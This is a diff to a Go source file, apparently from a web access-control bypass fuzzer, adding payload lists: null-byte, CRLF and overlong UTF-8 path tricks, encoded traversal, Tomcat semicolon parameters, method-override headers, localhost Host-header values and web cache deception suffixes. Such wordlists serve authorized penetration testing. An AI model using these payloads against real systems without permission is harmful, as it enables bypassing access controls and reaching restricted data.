@@ -87,6 +87,139 @@ var HTTPMethods = []string{
 	"OPTIONS",
 }
 
+// Path Normalization Bypass Payloads
+var PathNormalizationPayloads = []string{
+	// Tab/Null Injection
+	"%09",      // Tab
+	"%00",      // Null byte
+	"%00.jpg",  // Null byte with extension
+	"%00.html", // Null byte with extension
+	"%0d",      // Carriage return
+	"%0a",      // Line feed
+	"%0d%0a",   // CRLF
+	"%0c",      // Form feed
+
+	// Backslash Normalization (Windows-style)
+	"\\",
+	"\\..\\",
+	"\\.\\",
+	"..\\",
+	".\\",
+
+	// Semicolon Path Parameters (Java/Tomcat)
+	";",
+	";/",
+	";foo=bar",
+	";.js",
+	";.css",
+	";.json",
+	";x=1/",
+	";/..;/",
+
+	// URL Fragments
+	"#",
+	"#/",
+	"#.json",
+	"?#",
+	"?",
+	"??",
+	"?x=1",
+
+	// Overlong UTF-8 Encoding
+	"%c0%2e",       // Overlong .
+	"%c0%2e%c0%2e", // Overlong ..
+	"%c0%af",       // Overlong /
+	"%e0%80%af",    // 3-byte overlong /
+	"%f0%80%80%af", // 4-byte overlong /
+
+	// Mixed Encoding
+	"/%2e%2e/",
+	"/%2e./",
+	"/.%2e/",
+	"/%5c../", // Backslash encoded
+	"/%5c..%5c",
+}
+
+// Method Override Headers - for bypassing method restrictions
+var MethodOverrideHeaders = []string{
+	"X-HTTP-Method",
+	"X-HTTP-Method-Override",
+	"X-Method-Override",
+	"X-HTTP-Method-Overwrite",
+	"_method",
+}
+
+// Method Override Values - methods to try with override headers
+var MethodOverrideValues = []string{
+	"GET",
+	"POST",
+	"PUT",
+	"DELETE",
+	"PATCH",
+	"OPTIONS",
+	"HEAD",
+}
+
+// Host Header Attack Values
+var HostHeaderValues = []string{
+	"localhost",
+	"localhost:80",
+	"localhost:443",
+	"127.0.0.1",
+	"127.0.0.1:80",
+	"127.0.0.1:443",
+	"0.0.0.0",
+	"0.0.0.0:80",
+	"[::1]",
+	"[::1]:80",
+	"127.1",
+	"2130706433", // 127.0.0.1 in decimal
+}
+
+// Cache Deception Suffixes - for web cache deception attacks
+var CacheDeceptionSuffixes = []string{
+	"/style.css",
+	"/test.js",
+	"/logo.png",
+	"/image.jpg",
+	"/image.gif",
+	"/favicon.ico",
+	"/.css",
+	"/.js",
+	"/.png",
+	"/.jpg",
+	"/.gif",
+	"/.ico",
+	"/static/x.css",
+	"/assets/x.js",
+}
+
+// Content-Type Values - for content-type manipulation
+var ContentTypeValues = []string{
+	"application/json",
+	"application/xml",
+	"text/plain",
+	"text/html",
+	"application/x-www-form-urlencoded",
+	"multipart/form-data",
+	"text/xml",
+	"application/javascript",
+	"text/css",
+}
+
+// Accept Header Values - for accept header manipulation
+var AcceptHeaderValues = []string{
+	"application/json",
+	"application/xml",
+	"text/html",
+	"text/plain",
+	"*/*",
+	"application/pdf",
+	"image/webp",
+	"application/javascript",
+	"text/css",
+}
+
 var TopPrefixes = []string{
 	"/", "//", "///", "////", "/////", "//////",
 	"/./", "//./", "///./", "/././", "//././", "//././/",
